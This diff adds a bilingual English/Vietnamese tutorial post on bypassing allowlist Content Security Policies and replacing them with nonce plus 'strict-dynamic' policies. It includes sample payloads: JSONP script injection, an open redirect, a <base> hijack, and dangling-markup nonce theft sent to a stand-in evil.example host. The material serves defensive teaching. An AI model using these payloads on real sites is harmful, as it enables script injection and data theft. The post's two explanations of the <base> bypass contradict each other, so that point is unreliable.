@@ -1,0 +1,194 @@
+---
+title: 'Web Security for Frontend Devs · Part 13 — Strict CSP & CSP Bypasses'
+description: 'Advanced track: why allowlist CSPs get bypassed — JSONP and gadgets on trusted CDNs, open redirects, base-uri hijacks, scriptless exfiltration — and how a nonce + strict-dynamic policy stops them. With a simulator and exercises.'
+pubDate: 2026-06-16
+tags: [web-security, frontend, csp, web_security_10]
+series: web-security
+seriesOrder: 13
+draft: false
+---
+
+import SecurityDiagram from '../../components/blog/SecurityDiagram.astro';
+
+> **Part 13 — Advanced track** in the Web Security for Frontend Devs series \{**Phần 13 — Nhánh nâng cao** trong series Web Security for Frontend Devs\}. Previous \{Trước\}: [Part 12 — DOM Clobbering](/blog/web-security-12-dom-clobbering/) · Next \{Tiếp\}: [Part 14 — postMessage & Cross-Window Exploits](/blog/web-security-14-postmessage-cross-window-exploits/).
+
+[Part 3](/blog/web-security-03-content-security-policy/) taught you to *write* a Content Security Policy \{[Phần 3](/blog/web-security-03-content-security-policy/) dạy bạn *viết* một Content Security Policy\}. This advanced part teaches you to *break* one — because the policies most teams ship, **host allowlists** like `script-src 'self' https://cdn.example.com`, are bypassed so reliably that Google's own research found the vast majority of real-world CSPs provided **no meaningful XSS protection** \{Phần nâng cao này dạy bạn *phá* nó — vì policy hầu hết team ship, **allowlist host**, bị vượt đều đặn đến mức nghiên cứu của Google thấy phần lớn CSP thực tế **không bảo vệ XSS** đáng kể\}. Knowing the bypasses is the only way to understand why **nonce + `'strict-dynamic'`** is the modern default \{Biết các bypass là cách duy nhất hiểu vì sao **nonce + `'strict-dynamic'`** là mặc định hiện đại\}.
+
+<SecurityDiagram
+  kind="csp"
+  caption="CSP only decides what may run/load — if a trusted source can be coerced into serving attacker script, the policy passes the payload anyway"
+/>
+
+---
+
+## The mental model: CSP checks *sources*, not *intent* \{Mô hình tư duy: CSP kiểm *nguồn*, không kiểm *ý định*\}
+
+CSP answers one question per resource: *"is this load from an allowed source?"* \{CSP trả lời một câu hỏi mỗi tài nguyên: *"load này có từ nguồn được phép không?"*\} It does **not** know whether the JavaScript a trusted host returns is *yours* \{Nó **không** biết JavaScript một host tin cậy trả về có phải *của bạn* không\}. Every bypass below exploits that gap: the attacker finds a way to make an **already-allowlisted source** deliver their script, or finds an injection that **doesn't need script execution at all** \{Mọi bypass dưới đây khai thác khoảng trống đó: kẻ tấn công khiến một **nguồn đã allowlist** giao script của họ, hoặc tìm injection **không cần thực thi script**\}.
+
+---
+
+## Bypass 1 — JSONP endpoints on an allowlisted host \{Bypass 1 — endpoint JSONP trên host đã allowlist\}
+
+The classic. Your policy trusts a big CDN \{Kinh điển. Policy bạn tin một CDN lớn\}:
+
+```http
+Content-Security-Policy: script-src 'self' https://trusted-cdn.example
+```
+
+If that host serves **any JSONP endpoint** — a URL that reflects a `callback` parameter into executable JavaScript — the attacker injects a script tag pointing at it \{Nếu host đó phục vụ **bất kỳ endpoint JSONP** — URL phản chiếu tham số `callback` thành JavaScript chạy được — kẻ tấn công inject thẻ script trỏ tới đó\}:
+
+```html
+<!-- passes CSP: the host is allowlisted -->
+<script src="https://trusted-cdn.example/jsonp?callback=alert(document.domain)//"></script>
+```
+
+The endpoint responds with `alert(document.domain)//(...)` — valid JS, served from a trusted origin, **fully CSP-approved** \{Endpoint trả `alert(document.domain)//(...)` — JS hợp lệ, từ origin tin cậy, **được CSP duyệt hoàn toàn**\}. Many popular libraries historically shipped such gadgets; the *Google CSP Evaluator* and the *JSONPBypass* research catalog exist precisely because allowlisting these hosts is so common \{Nhiều thư viện phổ biến từng có gadget như vậy; chính vì allowlist các host này quá phổ biến mà công cụ đánh giá tồn tại\}.
+
+---
+
+## Bypass 2 — script gadgets in trusted bundles \{Bypass 2 — script gadget trong bundle tin cậy\}
+
+Even with no inline script allowed, a **script gadget** is legitimate code already on the page that *transforms DOM data into code execution* \{Kể cả khi không cho inline script, **script gadget** là code hợp lệ đã có trên trang *biến dữ liệu DOM thành thực thi code*\}. Classic example: an old AngularJS app where injecting `{{constructor.constructor('alert(1)')()}}` into a template binding executes — the framework, not the attacker's `<script>`, runs it \{Ví dụ kinh điển: app AngularJS cũ, inject `{{...}}` vào binding template sẽ chạy — framework chạy, không phải `<script>` của kẻ tấn công\}. HTML-sanitizer-plus-framework combos and `innerHTML`-driven auto-binding libraries are gadget factories \{Tổ hợp sanitizer + framework và thư viện auto-bind theo `innerHTML` là lò gadget\}. CSP cannot see this: no disallowed source is ever loaded \{CSP không thấy: không nguồn cấm nào được load\}.
+
+The lesson links straight back to [Part 11 (prototype pollution)](/blog/web-security-11-prototype-pollution/) and [Part 12 (DOM clobbering)](/blog/web-security-12-dom-clobbering/): scriptless and gadget-based attacks live *under* CSP's radar \{Bài học nối thẳng tới [Phần 11](/blog/web-security-11-prototype-pollution/) và [Phần 12](/blog/web-security-12-dom-clobbering/): tấn công không-script và dựa-gadget nằm *dưới* radar CSP\}.
+
+---
+
+## Bypass 3 — open redirects on an allowlisted host \{Bypass 3 — open redirect trên host đã allowlist\}
+
+CSP matches the **host of the URL you request**, then follows redirects \{CSP khớp **host của URL bạn yêu cầu**, rồi đi theo redirect\}. If an allowlisted host has an open redirect, the attacker points a script tag at the *trusted* host and lets it bounce to evil \{Nếu host allowlist có open redirect, kẻ tấn công trỏ thẻ script tới host *tin cậy* rồi để nó nhảy sang evil\}:
+
+```html
+<script src="https://trusted.example/redirect?url=https://evil.example/x.js"></script>
+```
+
+After a redirect, the **path** portion of allowlist entries is *ignored* by the spec for the resulting resource — which is why `script-src https://trusted.example/safe/only/` does **not** save you once a redirect is in play \{Sau redirect, phần **path** của mục allowlist bị spec *bỏ qua* cho tài nguyên kết quả — nên `script-src https://trusted.example/safe/only/` **không** cứu bạn khi có redirect\}. Open redirects (see [Part 10](/blog/web-security-10-input-validation-open-redirect-threat-model/)) are not just phishing — they are CSP-bypass primitives \{Open redirect (xem [Phần 10](/blog/web-security-10-input-validation-open-redirect-threat-model/)) không chỉ là phishing — chúng là primitive vượt CSP\}.
+
+---
+
+## Bypass 4 — missing `base-uri` retargets relative scripts \{Bypass 4 — thiếu `base-uri` làm đổi đích script tương đối\}
+
+If your scripts are loaded by **relative path** and your policy omits `base-uri`, an injected `<base>` tag rewrites where those relative URLs resolve \{Nếu script load bằng **path tương đối** và policy thiếu `base-uri`, một thẻ `<base>` tiêm vào đổi nơi URL tương đối phân giải\}:
+
+```html
+<!-- injected before your <script src="app.js"> -->
+<base href="https://evil.example/">
+<!-- now app.js loads from https://evil.example/app.js -->
+```
+
+`script-src 'self'` looks airtight, yet the script now comes from evil — because `'self'` was evaluated against the *base-rewritten* URL \{`script-src 'self'` trông kín, nhưng script giờ từ evil — vì `'self'` được đánh giá theo URL *đã đổi base*\}. Always set **`base-uri 'none'`** (or `'self'`) \{Luôn set **`base-uri 'none'`** (hoặc `'self'`)\}.
+
+---
+
+## Bypass 5 — scriptless data theft & nonce exfiltration \{Bypass 5 — trộm dữ liệu không-script & rò nonce\}
+
+A strict `script-src` can stop execution while `img-src`/`connect-src` still allow **data exfiltration** \{`script-src` nghiêm có thể chặn thực thi nhưng `img-src`/`connect-src` vẫn cho **rò dữ liệu**\}. **Dangling markup injection**: inject an unterminated attribute so the browser swallows the following HTML — including a fresh **nonce** — into a request to the attacker \{**Dangling markup injection**: tiêm thuộc tính chưa đóng để trình duyệt nuốt HTML theo sau — gồm cả **nonce** mới — vào một request tới kẻ tấn công\}:
+
+```html
+<!-- attacker injection opens an <img> whose src is never closed -->
+<img src="https://evil.example/log?html=
+<!-- everything until the next quote, including: -->
+<script nonce="THE-REAL-NONCE" ...>
+```
+
+The browser sends everything up to the next quote as the image URL — leaking the per-response nonce, which the attacker can then reuse in a second-stage injection \{Trình duyệt gửi mọi thứ tới dấu nháy kế làm URL ảnh — rò nonce mỗi-response, kẻ tấn công tái dùng ở injection giai đoạn hai\}. Defenses: a restrictive `img-src`/`connect-src`, avoiding reflected nonces near injection points, and **`'strict-dynamic'`** so a stolen nonce alone is less useful \{Phòng thủ: `img-src`/`connect-src` chặt, tránh phản chiếu nonce gần điểm inject, và **`'strict-dynamic'`**\}.
+
+---
+
+## The fix: a real strict CSP \{Cách sửa: một CSP strict thật sự\}
+
+The takeaway from every bypass: **stop allowlisting hosts for scripts**. Trust scripts by **nonce**, let them transitively load the rest via **`'strict-dynamic'`**, and lock the side doors \{Bài học từ mọi bypass: **ngừng allowlist host cho script**. Tin script qua **nonce**, để chúng nạp phần còn lại qua **`'strict-dynamic'`**, và khóa các cửa hông\}:
+
+```http
+Content-Security-Policy:
+  script-src 'nonce-{RANDOM_PER_RESPONSE}' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  require-trusted-types-for 'script';
+```
+
+Why this shape is robust \{Vì sao hình dạng này bền\}:
+
+- **`'nonce-…'`** — only *your* server-rendered tags carry the random nonce; injected `<script>` cannot guess it \{chỉ thẻ server render *của bạn* mang nonce ngẫu nhiên; `<script>` tiêm không đoán được\}.
+- **`'strict-dynamic'`** — nonce-trusted scripts may load more scripts, so you never need host allowlists (and there's nothing to JSONP-bypass) \{script tin-nonce nạp thêm script được, nên không cần allowlist host (không có gì để JSONP-bypass)\}.
+- **`https:` and `'unsafe-inline'`** — pure **fallbacks for old browsers** that ignore `'strict-dynamic'`/nonces; modern browsers ignore them *because* a nonce is present \{**fallback cho trình duyệt cũ** bỏ qua `'strict-dynamic'`/nonce; trình duyệt hiện đại bỏ qua chúng *vì* có nonce\}.
+- **`object-src 'none'` + `base-uri 'none'`** — close Bypass 4 and plugin surfaces \{đóng Bypass 4 và mặt plugin\}.
+
+This is the policy shape Google's CSP Evaluator scores as *strong* \{Đây là hình dạng policy mà CSP Evaluator của Google chấm *mạnh*\}. Roll it out **report-only first** ([Part 3](/blog/web-security-03-content-security-policy/)) \{Triển khai **report-only trước** ([Phần 3](/blog/web-security-03-content-security-policy/))\}.
+
+---
+
+## Try it — CSP policy & bypass simulator \{Thử ngay — trình mô phỏng policy & bypass CSP\}
+
+Pick a policy, fire injected payloads at it (inline script, JSONP on an allowlisted CDN, `<base>` hijack, dangling-markup exfil), and see exactly which the policy **blocks** vs **lets through** — and why \{Chọn một policy, bắn các payload tiêm vào nó (inline script, JSONP trên CDN allowlist, hijack `<base>`, rò dangling-markup), và xem chính xác cái nào policy **chặn** vs **cho qua** — và vì sao\}.
+
+<iframe
+  src="/tools/csp-bypass-demo/"
+  title="Interactive CSP policy and bypass simulator"
+  loading="lazy"
+  style="width:100%;height:820px;border:1px solid var(--color-border);border-radius:8px;background:#0a0a0a;"
+></iframe>
+
+Open the full demo \{Mở demo đầy đủ\}: [/tools/csp-bypass-demo/](/tools/csp-bypass-demo/).
+
+---
+
+## Prevention checklist \{Checklist phòng tránh\}
+
+1. Prefer **nonce + `'strict-dynamic'`** over host allowlists for `script-src` \{Ưu tiên **nonce + `'strict-dynamic'`** hơn allowlist host\}.
+2. Audit every allowlisted host for **JSONP endpoints and open redirects** \{Rà mọi host allowlist tìm **JSONP và open redirect**\}.
+3. Always set **`object-src 'none'`** and **`base-uri 'none'`** (or `'self'`) \{Luôn set **`object-src 'none'`** và **`base-uri 'none'`**\}.
+4. Constrain **`img-src`/`connect-src`** to limit scriptless exfiltration \{Siết **`img-src`/`connect-src`** để hạn chế rò không-script\}.
+5. Generate a **fresh nonce per response**; never cache a page with its nonce \{Sinh **nonce mới mỗi response**; không cache trang kèm nonce\}.
+6. Run the policy through **CSP Evaluator**; roll out **report-only** before enforcing \{Chạy policy qua **CSP Evaluator**; triển khai **report-only** trước khi ép\}.
+7. Remember CSP does not stop **gadgets** (Parts 11–12) — keep sanitizing and validating \{Nhớ CSP không chặn **gadget** (Phần 11–12) — vẫn sanitize và validate\}.
+
+---
+
+## Bài tập / Exercises
+
+**1.** Your policy is `script-src 'self' https://cdn.example`. Pentest finds `https://cdn.example/api/jsonp?callback=`. Write the injection that bypasses CSP, and the one-line policy change that fixes it \{Policy là `script-src 'self' https://cdn.example`. Pentest tìm thấy endpoint JSONP. Viết injection vượt CSP và thay đổi một dòng để sửa\}.
+
+<details>
+<summary>Solution \{Lời giải\}</summary>
+
+```html
+<script src="https://cdn.example/api/jsonp?callback=alert(document.domain)//"></script>
+```
+
+The host is allowlisted, so CSP approves it; the endpoint reflects `callback` into runnable JS \{Host đã allowlist nên CSP duyệt; endpoint phản chiếu `callback` thành JS chạy được\}. Fix: drop the host allowlist and switch to `script-src 'nonce-{rnd}' 'strict-dynamic'` — now an injected tag without the nonce cannot load, regardless of host \{Sửa: bỏ allowlist host, đổi sang `script-src 'nonce-{rnd}' 'strict-dynamic'` — thẻ tiêm không có nonce không load được, bất kể host\}.
+</details>
+
+**2.** Explain why `script-src 'self'` does not protect a page whose scripts use relative `src` if `base-uri` is unset \{Giải thích vì sao `script-src 'self'` không bảo vệ trang dùng `src` tương đối nếu `base-uri` chưa set\}.
+
+<details>
+<summary>Solution \{Lời giải\}</summary>
+
+An injected `<base href="https://evil.example/">` changes the document base, so `<script src="app.js">` resolves to `https://evil.example/app.js` \{`<base>` tiêm đổi base document, nên `app.js` phân giải thành URL evil\}. CSP evaluates `'self'` against that rewritten absolute URL, which is now cross-origin and blocked — *but only if you noticed*; many apps load from CDNs that the base rewrite redirects to. The fix is `base-uri 'none'`, which forbids the injected `<base>` from taking effect \{Sửa bằng `base-uri 'none'`, cấm `<base>` tiêm có hiệu lực\}.
+</details>
+
+**3.** Why are `https:` and `'unsafe-inline'` *safe* to include alongside `'nonce-…' 'strict-dynamic'`? \{Vì sao `https:` và `'unsafe-inline'` *an toàn* khi đặt cùng `'nonce-…' 'strict-dynamic'`?\}
+
+<details>
+<summary>Solution \{Lời giải\}</summary>
+
+They are **backwards-compatibility fallbacks**. A browser that supports `'strict-dynamic'`/nonces **ignores** `'unsafe-inline'` and host/scheme allowlists *when a nonce or hash is present*, so modern enforcement stays strict \{Chúng là **fallback tương thích ngược**. Trình duyệt hỗ trợ `'strict-dynamic'`/nonce **bỏ qua** `'unsafe-inline'` và allowlist host/scheme *khi có nonce/hash*\}. Old browsers that don't understand `'strict-dynamic'` fall back to `https:`/`'unsafe-inline'` so the site still functions — they get weaker (but not worse-than-before) protection \{Trình duyệt cũ không hiểu `'strict-dynamic'` fallback về `https:`/`'unsafe-inline'` để site vẫn chạy\}.
+</details>
+
+**Stretch \{Nâng cao\}:** Take a real CSP from a site you use (DevTools → Network → response headers), paste it into Google's CSP Evaluator, and identify whether it relies on host allowlists. Rewrite it to the nonce + `'strict-dynamic'` shape \{Lấy một CSP thật, dán vào CSP Evaluator, xác định nó có dựa allowlist host không, rồi viết lại theo dạng nonce + `'strict-dynamic'`\}.
+
+---
+
+## Key takeaways \{Điểm chính\}
+
+- CSP checks **sources, not intent** — a trusted host that serves attacker script (JSONP, redirect, gadget) bypasses it \{CSP kiểm **nguồn, không kiểm ý định**\}.
+- **Host allowlists are the weak shape**: JSONP, open redirects, and script gadgets defeat them \{**Allowlist host là dạng yếu**\}.
+- **`<base>` injection** retargets relative scripts unless `base-uri` is locked \{**Tiêm `<base>`** đổi đích script tương đối nếu `base-uri` chưa khóa\}.
+- Strict `script-src` doesn't stop **scriptless exfiltration** (dangling markup, nonce theft) — constrain `img-src`/`connect-src` too \{`script-src` nghiêm không chặn **rò không-script**\}.
+- The robust default is **`'nonce-…' 'strict-dynamic'` + `object-src 'none'` + `base-uri 'none'`**, validated with CSP Evaluator and rolled out report-only \{Mặc định bền là **nonce + `'strict-dynamic'` + `object-src 'none'` + `base-uri 'none'`**\}.
+
+---
+
+## Next up \{Tiếp theo\}
+
+The advanced track continues with **postMessage & cross-window messaging exploits** — origin confusion, `'*'` targets, and confused-deputy bugs across iframes and popups \{Nhánh nâng cao tiếp tục với **khai thác postMessage & messaging giữa cửa sổ** — nhầm origin, đích `'*'`, và lỗi confused-deputy giữa iframe và popup\}. Continue to [Part 14 — postMessage & Cross-Window Exploits](/blog/web-security-14-postmessage-cross-window-exploits/).
